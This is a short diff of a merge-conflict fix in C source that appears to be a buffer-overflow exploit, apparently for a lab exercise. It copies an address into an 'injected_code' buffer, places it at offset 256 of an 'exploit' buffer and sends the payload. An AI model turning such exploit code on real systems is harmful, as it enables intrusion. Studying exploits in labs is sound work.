@@ -220,15 +220,9 @@ int main(int argc, char* argv[]) {
    ;
    
    memcpy((char*)injected_code + 1, &cur_ownme_addr, sizeof(unsigned));
-<<<<<<< HEAD
    memcpy((char*)exploit + 256, &injected_code, sizeof(injected_code));
 
-=======
-   memcpy((char*)injected_code + 10, &cur_mainloop_ra, sizeof(unsigned));
-   memcpy((char*)exploit + 256, injected_code, sizeof(injected_code));
-
    // Write payload
->>>>>>> 746def60e3a0e8126784389299d302190905e3f1
    put_bin((void*)exploit, explsz);
    send();
 
